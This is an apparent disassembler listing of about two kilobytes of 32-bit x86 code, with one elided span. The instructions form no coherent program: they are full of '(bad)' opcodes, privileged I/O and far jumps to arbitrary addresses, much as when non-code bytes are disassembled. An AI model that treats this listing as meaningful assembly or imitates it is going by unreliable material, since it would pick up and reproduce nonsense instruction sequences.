  41e89a:	aaa    
  41e89b:	push   eax
  41e89c:	outs   dx,BYTE PTR ds:[esi]
  41e89d:	inc    esi
  41e89e:	mov    edx,0x7fc2814d
  41e8a3:	sub    ah,BYTE PTR [esi-0x31b7ab8]
  41e8a9:	inc    edi
  41e8aa:	push   esi
  41e8ab:	fistp  DWORD PTR [edx]
  41e8ad:	push   edi
  41e8ae:	cld    
  41e8af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8b0:	mov    ebp,es
  41e8b2:	pop    ebx
  41e8b3:	mov    ah,0x1
  41e8b5:	jg     0x41e8be
  41e8b7:	ins    BYTE PTR es:[edi],dx
  41e8b8:	retf   
  41e8b9:	cmp    DWORD PTR [ebp-0x55],ebp
  41e8bc:	cmp    ebp,ebp
  41e8be:	arpl   WORD PTR [ebp+0x2b274721],di
  41e8c4:	push   ebx
  41e8c5:	shl    DWORD PTR [ecx-0x56],cl
  41e8c8:	sub    al,0x92
  41e8ca:	mov    BYTE PTR ds:0x31bf5285,cl
  41e8d0:	dec    edi
  41e8d1:	outs   dx,DWORD PTR ds:[esi]
  41e8d2:	retf   0x4ef5
  41e8d5:	call   DWORD PTR [ebx-0x58]
  41e8d8:	shl    BYTE PTR [eax+0x442b6015],1
  41e8de:	push   ebx
  41e8df:	push   ss
  41e8e0:	in     al,dx
  41e8e1:	sbb    eax,0x22b9b2d2
  41e8e6:	pop    esp
  41e8e7:	mov    ebx,0x24f1ca26
  41e8ec:	addr16 xchg ebp,eax
  41e8ee:	xchg   edx,eax
  41e8ef:	lea    ecx,[ecx+0x3f]
  41e8f2:	mov    bh,0x8c
  41e8f4:	aaa    
  41e8f5:	pop    edx
  41e8f6:	adc    eax,0xb27f364a
  41e8fb:	icebp  
  41e8fc:	icebp  
  41e8fd:	xchg   ecx,eax
  41e8fe:	mov    ds:0x1855d358,al
  41e903:	mov    esi,eax
  41e905:	cli    
  41e906:	bound  edi,QWORD PTR [edx]
  41e908:	fsubr  st,st(7)
  41e90a:	hlt    
  41e90b:	mov    bh,0x52
  41e90d:	jae    0x41e8b4
  41e90f:	jno    0x41e939
  41e911:	daa    
  41e912:	into   
  41e913:	cmp    eax,0x9de58de2
  41e918:	mov    bl,al
  41e91a:	mov    ecx,0xbff9166a
  41e91f:	and    al,0x9d
  41e921:	jae    0x41e94f
  41e923:	xor    eax,0xca8f6eb2
  41e928:	outs   dx,BYTE PTR ds:[esi]
  41e929:	fisubr WORD PTR [ebx-0x25]
  41e92c:	or     esp,ebx
  41e92e:	dec    eax
  41e92f:	loopne 0x41e8e3
  41e931:	push   ecx
  41e932:	mov    al,ds:0xa8312e72
  41e937:	jno    0x41e966
  41e939:	mov    DWORD PTR [ecx],edx
  41e93b:	sbb    DWORD PTR ds:0x778fc7e2,esp
  41e941:	inc    ebp
  41e942:	push   es
  41e943:	xor    ecx,DWORD PTR [ecx]
  41e945:	mov    eax,ds:0x87473b27
  41e94a:	scas   eax,DWORD PTR es:[edi]
  41e94b:	leave  
  41e94c:	mov    bl,0xb3
  41e94e:	mov    BYTE PTR [esi+0x7d333ff0],al
  41e954:	cmp    eax,DWORD PTR [ebx-0xb3d9c60]
  41e95a:	cmp    BYTE PTR [ebp-0x32011382],bh
  41e960:	pop    esp
  41e961:	retf   0x3e98
  41e964:	mov    ecx,0xfb3b4d1c
  41e969:	xchg   ebx,eax
  41e96a:	aaa    
  41e96b:	das    
  41e96c:	das    
  41e96d:	cmp    BYTE PTR [edx-0x2a],ah
  41e970:	loope  0x41e959
  41e972:	add    BYTE PTR [eax-0x26],0xdc
  41e976:	adc    eax,0x3be4b426
  41e97b:	pusha  
  41e97c:	(bad)  
  41e97d:	stc    
  41e97e:	inc    edx
  41e97f:	shr    eax,cl
  41e981:	xor    eax,0x15a47b75
  41e986:	gs iret 
  41e988:	imul   edi,DWORD PTR [ebx+0x4dab9d78],0x4771c01d
  41e992:	xchg   BYTE PTR [esi+eax*8],cl
  41e995:	pop    ss
  41e996:	retf   
  41e997:	jmp    0xcb94c586
  41e99c:	push   ebp
  41e99d:	jne    0x41e9d1
  41e99f:	fcom   DWORD PTR [ebx-0x5c]
  41e9a2:	or     bh,0xae
  41e9a5:	cmp    eax,0x28
  41e9a8:	inc    ebx
  41e9a9:	push   0xffffffde
  41e9ab:	rcr    ebx,0xf2
  41e9ae:	rcr    dl,1
  41e9b0:	cmp    DWORD PTR [eax+0x22],edi
  41e9b3:	or     edi,DWORD PTR [esi+eax*8]
  41e9b6:	push   eax
  41e9b7:	loop   0x41e953
  41e9b9:	and    ch,al
  41e9bb:	cmp    al,0xf5
  41e9bd:	inc    ebx
  41e9be:	xor    eax,0x4f7ca1fc
  41e9c3:	xchg   esp,eax
  41e9c4:	xchg   edx,eax
  41e9c5:	xchg   edi,eax
  41e9c6:	jmp    0x798d:0x356400bf
  41e9cd:	dec    ebp
  41e9ce:	pop    es
  41e9cf:	pusha  
  41e9d0:	sub    DWORD PTR [ecx+0x24e047ef],esp
  41e9d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9d7:	jl     0x41e9a4
  41e9d9:	popf   
  41e9da:	mov    edi,DWORD PTR [edi]
  41e9dc:	mov    ?,esi
  41e9de:	xchg   ebp,eax
  41e9df:	mov    cl,BYTE PTR [eax+0xe035db7]
  41e9e5:	pop    edx
  41e9e6:	xor    ebp,DWORD PTR [edi+0x7399d8bd]
  41e9ec:	jo     0x41ea6a
  41e9ee:	stc    
  41e9ef:	(bad)  
  41e9f0:	jmp    0x41ea25
  41e9f2:	shl    BYTE PTR [esi],1
  41e9f4:	icebp  
  41e9f5:	stos   DWORD PTR es:[edi],eax
  41e9f6:	mov    dh,0xf2
  41e9f8:	sub    ah,BYTE PTR [esi-0x69]
  41e9fb:	xchg   ebx,eax
  41e9fc:	adc    al,0x86
  41e9fe:	mov    esi,DWORD PTR [esi-0x1e73b9d7]
  41ea04:	adc    ch,BYTE PTR [edi+0x47c2b071]
  41ea0a:	mov    al,ds:0x5d5bde16
  41ea0f:	(bad)  
  41ea11:	xchg   BYTE PTR [ebx-0xdc02d2c],al
  41ea17:	hlt    
  41ea18:	mov    ch,0x96
  41ea1a:	test   BYTE PTR [esi+0x55],ah
  41ea1d:	pop    eax
  41ea1e:	xor    DWORD PTR [esi-0x6b],ebx
  41ea21:	mov    ecx,0x6a92cbb9
  41ea26:	inc    esp
  41ea27:	int3   
  41ea28:	push   ss
  41ea29:	adc    DWORD PTR [edi],0xfffffff7
  41ea2c:	outs   dx,BYTE PTR ds:[esi]
  41ea2d:	xchg   ebx,eax
  41ea2e:	xchg   esi,eax
  41ea2f:	mov    bl,0xa5
  41ea31:	mov    eax,0xf82ce08e
  41ea36:	ss push edi
  41ea38:	stc    
  41ea39:	ror    ah,cl
  41ea3b:	sub    DWORD PTR [ebx-0x3e],esi
  41ea3e:	pop    edi
  41ea3f:	das    
  41ea40:	push   edx
  41ea41:	add    eax,0xbbb10897
  41ea46:	dec    edx
  41ea47:	fucompp 
  41ea49:	pop    edi
  41ea4a:	ret    
  41ea4b:	sub    eax,0xc28f9b4e
  41ea50:	mov    BYTE PTR [edx-0x488409aa],cl
  41ea56:	pop    ebp
  41ea57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea58:	fldenv cs:[edx+ebx*1+0x4c]
  41ea5d:	inc    eax
  41ea5e:	jo     0x41ea51
  41ea60:	popa   
  41ea61:	mov    al,ds:0xd7dbc860
  41ea66:	dec    edi
  41ea67:	sub    bh,BYTE PTR [esi+0x3f0c49be]
  41ea6d:	jmp    0x332042fc
  41ea72:	aad    0x36
  41ea74:	and    dh,BYTE PTR [esp+eax*8+0x22e7fb4a]
  41ea7b:	pop    esp
  41ea7c:	iret   
  41ea7d:	int3   
  41ea7e:	(bad)  
  41ea7f:	ficomp WORD PTR [eax+0x56566de3]
  41ea85:	xor    BYTE PTR [edi-0x60ee7cd6],ah
  41ea8b:	add    ebp,DWORD PTR [edx+0xa82440f]
  41ea91:	sbb    al,0x4e
  41ea93:	jge    0x41ea93
  41ea95:	adc    al,0x3b
  41ea97:	shl    DWORD PTR [esi+0x33dca71a],0xd1
  41ea9e:	mov    ah,0x91
  41eaa0:	mov    bh,0x14
  41eaa2:	mov    ah,0x12
  41eaa4:	pop    esi
  41eaa5:	sbb    ch,BYTE PTR [esi+0x1c08cf8c]
  41eaab:	(bad)  
  41eaac:	mov    WORD PTR [ebx-0x52e3e820],?
  41eab2:	mov    ecx,0x6f6df4f1
  41eab7:	and    ah,BYTE PTR ds:0x802e095
  41eabd:	das    
  41eabe:	stos   BYTE PTR es:[edi],al
  41eabf:	jecxz  0x41eae9
  41eac1:	sub    ah,dh
  41eac3:	out    0x8c,al
  41eac5:	mul    DWORD PTR [ebx+0x24]
  41eac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eac9:	cmp    edx,ecx
  41eacb:	(bad)  
  41eacc:	mov    bh,0x4d
  41eace:	mov    edx,0x3de19aa7
  41ead3:	dec    ebx
  41ead4:	push   ds
  41ead5:	outs   dx,BYTE PTR ds:[esi]
  41ead6:	fst    DWORD PTR [ecx+0x20]
  41ead9:	aam    0x5
  41eadb:	mov    esp,0x689a4bab
  41eae0:	popa   
  41eae1:	sub    edi,ecx
  41eae3:	mov    ebp,0xf523d934
  41eae8:	mov    ebx,0xd890cd00
  41eaed:	in     eax,dx
  41eaee:	test   al,0x90
  41eaf0:	cli    
  41eaf1:	push   ds
  41eaf2:	fistp  DWORD PTR [ecx-0x7ab62db9]
  41eaf8:	paddd  mm0,QWORD PTR [eax-0x3b]
  41eafc:	js     0x41eaac
  41eafe:	stc    
  41eaff:	jnp    0x41ea94
  41eb01:	loopne 0x41eb4c
  41eb03:	add    al,0x31
  41eb05:	dec    edi
  41eb06:	sbb    eax,0x3ad81042
  41eb0b:	mov    dh,cl
  41eb0d:	ret    0xe68f
  41eb10:	cli    
  41eb11:	les    edi,FWORD PTR [esi-0x3]
  41eb14:	ror    DWORD PTR [eax],cl
  41eb16:	in     eax,dx
  41eb17:	sbb    BYTE PTR [edx+0x40],dh
  41eb1a:	js     0x41eb07
  41eb1c:	jmp    0x7f84:0x8d0aab48
  41eb23:	mov    esi,0x5b74dae9
  41eb28:	sub    eax,0x3479ecf
  41eb2d:	cmp    DWORD PTR [edx+edx*4+0x78],0xf67f1012
  41eb35:	mov    al,ds:0x75cc94ba
  41eb3a:	cdq    
  41eb3b:	add    DWORD PTR [edi],esp
  41eb3d:	jb     0x41eb44
  41eb3f:	cs scas eax,DWORD PTR es:[edi]
  41eb41:	sbb    bl,0x7c
  41eb44:	xchg   edx,eax
  41eb45:	pushf  
  41eb46:	psubusb mm1,QWORD PTR [esi]
  41eb49:	mov    al,ds:0xe8d51523
  41eb4e:	and    eax,0x729d1d92
  41eb53:	sbb    BYTE PTR [eax],ah
  41eb55:	lds    eax,FWORD PTR [edx]
  41eb57:	shr    BYTE PTR [edi-0x36],0xad
  41eb5b:	push   edx
  41eb5c:	mov    DWORD PTR [eax],ebx
  41eb5e:	xor    edx,esi
  41eb60:	repz imul eax,DWORD PTR ds:0xb0c59b68,0x50
  41eb68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb69:	sub    eax,0xe12b0732
  41eb6e:	sbb    BYTE PTR ss:[edi],bh
  41eb71:	push   esi
  41eb72:	mov    ds:0xf2,eax
	...
  41ed4f:	add    dl,cl
  41ed51:	push   0xffffffe7
  41ed53:	ja     0x41ed3c
  41ed55:	(bad)  
  41ed56:	(bad)  
  41ed58:	daa    
  41ed59:	inc    ebx
  41ed5a:	call   0x66f65bd9
  41ed5f:	mov    al,0x5
  41ed61:	aam    0x1
  41ed63:	add    BYTE PTR [edx],ah
  41ed65:	pop    es
  41ed66:	add    BYTE PTR [eax],al
  41ed68:	inc    ecx
  41ed69:	jno    0x41edc6
  41ed6b:	push   es
  41ed6c:	adc    eax,0x3d141b16
  41ed71:	in     al,dx
  41ed72:	mov    bh,BYTE PTR ds:0xacc787aa
  41ed78:	push   eax
  41ed79:	(bad)  
  41ed7a:	aas    
  41ed7b:	mov    ecx,0xfd9009d9
  41ed80:	mov    esp,0x650440cb
  41ed85:	mov    eax,ds:0xef45047b
  41ed8a:	stos   DWORD PTR es:[edi],eax
  41ed8b:	aad    0x5f
  41ed8d:	call   0xde9f0f62
  41ed92:	fiadd  DWORD PTR cs:[ebx+0x490c5356]
  41ed99:	call   0x57f8:0x46a99c67
  41eda0:	out    dx,al
  41eda1:	xchg   edi,eax
  41eda2:	test   eax,0xcb78998
  41eda7:	xchg   ebx,eax
  41eda8:	test   eax,0x13c5c6c8
  41edad:	xchg   BYTE PTR [edx-0x64c00c22],dl
  41edb3:	mov    eax,esp
  41edb5:	mov    DWORD PTR [edi-0x48ab8f1f],eax
  41edbb:	fnstenv [ebp+0x745aace]
  41edc1:	add    eax,0x9d413304
  41edc6:	and    BYTE PTR [ebx],cl
  41edc8:	dec    edx
  41edc9:	cmc    
  41edca:	out    0xfe,eax
  41edcc:	mov    ebp,0x8054ffe8
  41edd1:	stos   DWORD PTR es:[edi],eax
  41edd2:	mov    ah,0x4b
  41edd4:	arpl   di,bx
  41edd6:	mov    ds:0x417e8d19,al
  41eddb:	fiadd  WORD PTR [edi+edi*4]
  41edde:	sub    DWORD PTR [edx-0x26],ebx
  41ede1:	inc    ebp
  41ede2:	sbb    DWORD PTR [ebx+0x501d1c05],edi
  41ede8:	push   eax
  41ede9:	(bad)  
  41edea:	mov    edi,0xa5733ad0
  41edef:	jecxz  0x41edcc
  41edf1:	stos   DWORD PTR es:[edi],eax
  41edf2:	fdiv   st(4),st
  41edf4:	(bad)  [esi+ebx*4-0x3c]
  41edf8:	shr    DWORD PTR [edi],cl
  41edfa:	fdiv   st(5),st
  41edfc:	aad    0xed
  41edfe:	aad    0x6f
  41ee00:	or     al,0xfc
  41ee02:	mov    ds:0x6f51b4bf,eax
  41ee07:	inc    edx
  41ee08:	add    al,0x9f
  41ee0a:	(bad)  
  41ee0b:	js     0x41edcf
  41ee0d:	pop    ecx
  41ee0e:	sbb    bh,al
  41ee10:	jecxz  0x41ee2f
  41ee12:	inc    esi
  41ee13:	mov    ecx,0x27ab24f3
  41ee18:	xchg   DWORD PTR [ecx-0x28],ebp
  41ee1b:	je     0x41edd1
  41ee1d:	sub    BYTE PTR [ecx],al
  41ee1f:	sbb    DWORD PTR [edi-0x49],0xffffff9e
  41ee23:	loope  0x41ee91
  41ee25:	stos   DWORD PTR es:[edi],eax
  41ee26:	pop    esi
  41ee27:	cld    
  41ee28:	cmp    cl,BYTE PTR [esi+0x4e443ab1]
  41ee2e:	xchg   ecx,eax
  41ee2f:	jns    0x41ee3e
  41ee31:	sahf   
  41ee32:	or     ebp,DWORD PTR [ecx]
  41ee34:	test   BYTE PTR [edx],bl
  41ee36:	fwait
  41ee37:	ror    dh,0xff
  41ee3a:	sub    eax,0xb8f77934
  41ee3f:	out    dx,eax
  41ee40:	das    
  41ee41:	popf   
  41ee42:	and    DWORD PTR [eax+0x6e],esp
  41ee45:	je     0x41edda
  41ee47:	push   ss
  41ee48:	stos   DWORD PTR es:[edi],eax
  41ee49:	icebp  
  41ee4a:	jg     0x41edd9
  41ee4c:	fstp   QWORD PTR [ebp-0x673f23d1]
  41ee52:	jg     0x41eeac
  41ee54:	adc    DWORD PTR [edx+0x5f],0xffffff9f
  41ee58:	fidiv  WORD PTR [ebx+0x39]
  41ee5b:	(bad)  
  41ee5c:	sub    al,0x1
  41ee5e:	js     0x41ede8
  41ee60:	sar    DWORD PTR [ebp+0x2c],cl
  41ee63:	mov    bl,ch
  41ee65:	or     eax,0xce5a7815
  41ee6a:	mov    dl,0xfe
  41ee6c:	ja     0x41ee58
  41ee6e:	outs   dx,DWORD PTR ds:[esi]
  41ee6f:	rcr    DWORD PTR [esi+0x7c59e271],1
  41ee75:	or     DWORD PTR [esi+0x791a8aef],esp
  41ee7b:	mov    edi,0x463befae
  41ee80:	jmp    0xb2f6:0xc98cb9c5
  41ee87:	inc    ebx
  41ee88:	xor    DWORD PTR [edi+eax*8+0x779523b5],0x61b275b6
  41ee93:	iret   
  41ee94:	mov    al,0x65
  41ee96:	jbe    0x41ee82
  41ee98:	pushf  
  41ee99:	inc    ebx
  41ee9a:	jmp    0x663ae2b0
  41ee9f:	sbb    eax,ebx
  41eea1:	loope  0x41ef03
  41eea3:	sub    BYTE PTR [eax],dl
  41eea5:	cmc    
  41eea6:	adc    ch,BYTE PTR [eax+eiz*4+0x71]
  41eeaa:	push   edx
  41eeab:	fisubr WORD PTR [esi+ecx*8+0x28]
  41eeaf:	jne    0x41eebc
  41eeb1:	xor    BYTE PTR [eax],ch
  41eeb3:	jb     0x41eede
  41eeb5:	fdiv   DWORD PTR [ebx-0x2a]
  41eeb8:	loop   0x41ee5c
  41eeba:	lock nop
  41eebc:	repz popa 
  41eebe:	fidivr WORD PTR [edx+0x7]
  41eec1:	xchg   ecx,eax
  41eec2:	in     eax,0xf9
  41eec4:	cmp    esp,edi
  41eec6:	xor    al,0x10
  41eec8:	jo     0x41ee4b
  41eeca:	mov    edi,0x634d3b09
  41eecf:	sar    DWORD PTR ds:0x227a11e6,cl
  41eed5:	inc    edx
  41eed6:	loop   0x41ee73
  41eed8:	mov    edx,0x24cfea04
  41eedd:	mov    ebx,0xc715f47d
  41eee2:	ins    DWORD PTR es:[edi],dx
  41eee3:	or     eax,0x181be7d3
  41eee8:	pop    ecx
  41eee9:	mov    ax,ds:0xe9d9fcf3
  41eeef:	fstp   DWORD PTR cs:[edx-0x9]
  41eef3:	gs popa 
  41eef5:	sbb    BYTE PTR [ebp+0x26ca0cba],ah
  41eefb:	xchg   ebp,eax
  41eefc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eefd:	loopne 0x41ef6d
  41eeff:	xchg   ebx,eax
  41ef00:	leave  
  41ef01:	jnp    0x41eeeb
  41ef03:	mov    bh,0xff
  41ef05:	mov    eax,ds:0x8aa78d13
  41ef0a:	pop    es
  41ef0b:	pop    ebx
  41ef0c:	cmp    eax,0x697f3147
  41ef11:	lods   al,BYTE PTR ds:[esi]
  41ef12:	iret   
  41ef13:	sahf   
  41ef14:	pop    ecx
  41ef15:	pop    esp
  41ef16:	and    BYTE PTR [eiz*4+0x15e10397],0x91
  41ef1e:	cmp    esp,eax
  41ef20:	cmc    
  41ef21:	sbb    eax,0xf0024c9b
  41ef26:	fstp   DWORD PTR [esi]
  41ef28:	fistp  DWORD PTR [esi-0x5edfe967]
  41ef2e:	loope  0x41ef4c
  41ef30:	xchg   DWORD PTR [ebp+0x62c3ee59],edx
  41ef36:	jmp    0x41ef23
  41ef38:	pop    ds
  41ef39:	dec    edi
  41ef3a:	cmc    
  41ef3b:	nop
  41ef3c:	in     eax,dx
  41ef3d:	pop    es
  41ef3e:	mov    WORD PTR [ebx+0x5f],es
  41ef41:	lds    edx,FWORD PTR [ebp+0x65777673]
  41ef47:	jns    0x41ef55
  41ef49:	loopne 0x41ef6b
  41ef4b:	les    ebx,FWORD PTR ds:0x485054d2
  41ef51:	out    dx,eax
  41ef52:	in     eax,dx
  41ef53:	inc    esp
  41ef54:	call   0xde6040e1
  41ef59:	(bad)  [eax]
  41ef5b:	or     BYTE PTR [eax+0x167b79b1],bl
  41ef61:	sar    DWORD PTR [edx-0x7a],1
  41ef64:	lea    ecx,ds:0x5bd07813
  41ef6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef6b:	outs   dx,BYTE PTR ds:[esi]
  41ef6c:	or     BYTE PTR [edi+0x68],dl
  41ef6f:	adc    eax,0x4ff6eb06
  41ef74:	jns    0x41eff5
  41ef76:	idiv   ebp
  41ef78:	sub    dh,BYTE PTR [eax+0x6f]
  41ef7b:	mov    eax,0x3243ac05
  41ef80:	sahf   
  41ef81:	or     ebp,DWORD PTR [edi]
  41ef83:	addr16 push ecx
  41ef85:	mov    dh,0xc5
  41ef87:	xchg   ebp,eax
  41ef88:	cmp    dl,BYTE PTR [ebx+0x44498733]
  41ef8e:	pop    esp
  41ef8f:	jle    0x41efc3
  41ef91:	call   0x281411b3
  41ef96:	dec    edi
  41ef97:	mov    esp,0xe360b74a
  41ef9c:	pop    es
  41ef9d:	push   cs
  41ef9e:	inc    ebx
  41ef9f:	in     eax,0x1b
  41efa1:	sbb    eax,0xf3d20a24
  41efa6:	xlat   BYTE PTR ds:[ebx]
  41efa7:	emms   
  41efa9:	mov    esi,0x979fd1be
  41efae:	imul   ecx,ebp,0x45607389
  41efb4:	sbb    bl,BYTE PTR [ebx-0x4c]
  41efb7:	scas   eax,DWORD PTR es:[edi]
  41efb8:	xor    al,0x14
  41efba:	cs sbb ch,bh
  41efbd:	shr    eax,0x9
  41efc0:	ret    0xbf27
  41efc3:	cmp    ebx,DWORD PTR [ebx+0x4b5edff2]
  41efc9:	aam    0x5f
  41efcb:	rcr    edx,1
  41efcd:	cmc    
  41efce:	cmp    bh,ah
  41efd0:	outs   dx,BYTE PTR ds:[esi]
  41efd1:	sub    BYTE PTR [ecx+edx*1],ah
  41efd4:	mov    BYTE PTR [esi+0x3e],ah
  41efd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efd8:	fldenv [eax+0x2b]
  41efdb:	je     0x41ef79
  41efdd:	out    0x35,al
  41efdf:	test   BYTE PTR [esp+esi*8+0x1d7b51ac],ah
  41efe6:	lea    esp,[eax-0x36a5dbe1]
  41efec:	xor    BYTE PTR [ebx-0x2d],cl
  41efef:	(bad)  
  41eff0:	mov    ebx,0x1f44a8f3
  41eff5:	int    0xe1
  41eff7:	pop    edi
  41eff8:	rol    BYTE PTR [bx+si-0x63],0xbd
  41effd:	fcom   DWORD PTR [esi+0x25]
  41f000:	jmp    0xa242:0x64737ee2
  41f007:	xchg   ecx,eax
  41f008:	(bad)  
  41f009:	bound  ebx,QWORD PTR [ecx+edx*4]
  41f00c:	and    ch,BYTE PTR [ebx+0x8e9ac77]
  41f012:	mov    eax,ds:0xd8b5d33f
  41f017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f018:	jle    0x41f05f
  41f01a:	mov    al,0x3c
  41f01c:	push   edx
  41f01d:	cmp    cl,BYTE PTR [eax+eax*4+0x38]
  41f021:	je     0x41f060
  41f023:	pop    edi
  41f024:	sbb    DWORD PTR [edx],ebp
  41f026:	mov    edx,0x367a5022
  41f02b:	pusha  
  41f02c:	xor    al,0x18
  41f02e:	les    edx,FWORD PTR [eax+0x3b069b0a]
  41f034:	jns    0x41f011
  41f036:	repz ret 0x5bb9
  41f03a:	in     al,dx
  41f03b:	mov    ecx,0xd238846
  41f040:	mov    ecx,0x3b2842b7
  41f045:	lds    ebp,FWORD PTR [edx-0x26]
  41f048:	add    DWORD PTR fs:[esi],0x3
  41f04c:	test   eax,0xaca7331
  41f051:	xor    DWORD PTR [ebp+ecx*8-0x21719fbb],ecx
  41f058:	cmc    
  41f059:	dec    edi
  41f05a:	fwait
  41f05b:	add    DWORD PTR [ecx-0x21fee2df],ebp
  41f061:	les    ebx,FWORD PTR [ecx-0x653de215]
  41f067:	pop    esp
  41f068:	lods   al,BYTE PTR ds:[esi]
  41f069:	pop    ebx
  41f06a:	or     eax,0x94e1ec5b
  41f06f:	and    al,0x19
  41f071:	mov    edi,0xb4b2ac9d
  41f076:	or     BYTE PTR [esi-0x3],dh
  41f079:	mov    ebp,0x78c71f63
  41f07e:	jo     0x41f068
  41f080:	aaa    
  41f081:	sbb    ebp,DWORD PTR ds:0xef3f8cd3
  41f087:	jge    0x41f0d3
  41f089:	retf   0x4ad6
  41f08c:	gs push ebp
  41f08e:	fmul   DWORD PTR [eax+0x5f5a1133]
  41f094:	mov    eax,ds:0xf9a59063
  41f099:	push   ebx
  41f09a:	inc    edi
  41f09b:	jle    0x41f0bc
  41f09d:	jno    0x41f03c
  41f09f:	aad    0x92
  41f0a1:	pop    ebp
  41f0a2:	jbe    0x41f033
  41f0a4:	sub    esp,esi
  41f0a6:	xchg   ebp,eax
  41f0a7:	(bad)  
  41f0a8:	and    ch,BYTE PTR ds:0x5ab59645
  41f0ae:	ja     0x41f0bb
  41f0b0:	mov    dh,0x5d
  41f0b2:	es (bad) 
  41f0b4:	call   0xac0f39f2
  41f0b9:	mov    WORD PTR [esi+0x61],es
  41f0bc:	push   ecx
  41f0bd:	stc    
  41f0be:	and    ebx,DWORD PTR [edi]
  41f0c0:	push   esp
  41f0c1:	dec    esi
  41f0c2:	rcr    BYTE PTR [ecx-0x70],0x46
  41f0c6:	inc    esp
  41f0c7:	out    0xf5,eax
  41f0c9:	stos   DWORD PTR es:[edi],eax
  41f0ca:	mov    al,ds:0x5d2c823a
  41f0cf:	xchg   ecx,eax
  41f0d0:	add    bh,BYTE PTR [esi-0x45]
  41f0d3:	(bad)  
  41f0d4:	in     al,dx
  41f0d5:	and    edx,esp
  41f0d7:	or     bh,BYTE PTR [ebp+0x4591c287]
  41f0dd:	fistp  WORD PTR [edi+0x1cf9e0ef]
  41f0e3:	add    esp,DWORD PTR [edx]
  41f0e5:	inc    edx
  41f0e6:	sbb    esi,DWORD PTR ds:0x63e225cf
  41f0ec:	sbb    dh,ch
  41f0ee:	mov    edx,ebx
  41f0f0:	pop    edi
  41f0f1:	rcr    DWORD PTR [eax-0x15],0x80
  41f0f5:	imul   esp,esp,0xffffffcd
  41f0f8:	xchg   edx,eax
  41f0f9:	retf   
  41f0fa:	push   ds
  41f0fb:	jle    0x41f0ce
  41f0fd:	outs   dx,BYTE PTR ds:[esi]
  41f0fe:	daa    
  41f0ff:	ins    BYTE PTR es:[edi],dx
  41f100:	cmp    dh,BYTE PTR [edi-0x61]
  41f103:	jne    0x41f183
  41f105:	push   edx
  41f106:	xor    ecx,eax
  41f108:	jno    0x41f16c
  41f10a:	mov    DWORD PTR [edi+0x7e],edi
  41f10d:	mov    DWORD PTR [esp+eiz*2+0x30925721],eax
  41f114:	jmp    0x41f158
  41f116:	fadd   st(3),st
  41f118:	int    0x63
  41f11a:	pop    edi
  41f11b:	cmp    bl,BYTE PTR [eax]
  41f11d:	ds repz dec esp
  41f120:	jb     0x41f19e
  41f122:	cmp    DWORD PTR [edi-0x1dbdfd42],esi
  41f128:	jbe    0x41f0dd
  41f12a:	fbstp  TBYTE PTR [edi+0x77]
  41f12d:	pop    edi
  41f12e:	sahf   
  41f12f:	mov    dl,0xc5
  41f131:	push   0x2c
  41f133:	mov    ds:0x65a22536,al
  41f138:	sub    bl,0x2
  41f13b:	mov    DWORD PTR [ecx-0x1b],ecx
  41f13e:	test   al,0x8e
  41f140:	div    cl
  41f142:	inc    eax
  41f143:	sub    al,0x27
  41f145:	pop    ebx
  41f146:	ins    DWORD PTR es:[edi],dx
  41f147:	into   
  41f148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f149:	mov    dh,0xb
  41f14b:	rcl    cl,0x44
  41f14e:	cmc    
  41f14f:	pop    es
  41f150:	jbe    0x41f15a
  41f152:	mov    bh,0x52
  41f154:	retf   
  41f155:	cmp    al,0xcc
  41f157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f158:	mov    edi,0x83c82820
  41f15d:	and    bl,0x94
  41f160:	add    BYTE PTR [esi],0x57
  41f163:	push   esi
  41f164:	sbb    DWORD PTR ds:0x644ecdea,0x17
  41f16b:	add    BYTE PTR [esi],ah
  41f16d:	lock xchg ebp,eax
  41f16f:	shr    BYTE PTR [edx+0x34],cl
  41f172:	pop    esi
  41f173:	dec    edi
  41f174:	gs pop ds
  41f176:	sub    al,0xd9
  41f178:	push   esp
  41f179:	push   ss
  41f17a:	popf   
  41f17b:	test   BYTE PTR [esp+ebx*4-0x44],0x6e
  41f180:	add    eax,0x681d621b
  41f185:	sub    al,0x2a
  41f187:	hlt    
  41f188:	aas    
  41f189:	mov    dh,0xf6
  41f18b:	loopne 0x41f162
  41f18d:	adc    BYTE PTR [ecx+0x76fcac44],bl
  41f193:	jne    0x41f1b8
  41f195:	pop    edx
  41f196:	cli    
  41f197:	jae    0x41f1ac
  41f199:	xor    BYTE PTR [ecx-0x4b77761c],ch
  41f19f:	inc    eax
  41f1a0:	(bad)  
  41f1a1:	jl     0x41f1e7
  41f1a3:	popa   
  41f1a4:	add    eax,ebp
  41f1a6:	fcmovbe st,st(0)
  41f1a8:	pop    eax
  41f1a9:	gs push es
  41f1ab:	lods   al,BYTE PTR ds:[esi]
  41f1ac:	fucom  st(1)
  41f1ae:	adc    BYTE PTR [esi+0x7],ch
  41f1b1:	scas   eax,DWORD PTR es:[edi]
  41f1b2:	mov    edi,0xbabb6202
  41f1b7:	pop    esp
  41f1b8:	call   0x5313:0x51d5700e
  41f1bf:	dec    esi
  41f1c0:	jae    0x41f17e
  41f1c2:	mov    esp,0x4c7466e6
  41f1c7:	fiadd  WORD PTR [ecx]
  41f1c9:	jecxz  0x41f21e
  41f1cb:	sbb    eax,0xaf524e1b
  41f1d0:	mov    ah,ah
  41f1d2:	cmp    edx,ecx
  41f1d4:	stos   DWORD PTR es:[edi],eax
  41f1d5:	popa   
  41f1d6:	xchg   ecx,eax
  41f1d7:	sahf   
  41f1d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1d9:	out    0x2f,eax
  41f1db:	int3   
  41f1dc:	mov    esp,0x3b6fd2aa
  41f1e1:	push   0xfffffff4
  41f1e3:	lea    ebp,[eax-0x4a]
  41f1e6:	addr16 sbb dh,ah
  41f1e9:	popf   
  41f1ea:	mov    bl,dl
  41f1ec:	mov    esi,0x24e91c1d
  41f1f1:	add    eax,0xb1843f3d
  41f1f6:	add    al,0xf
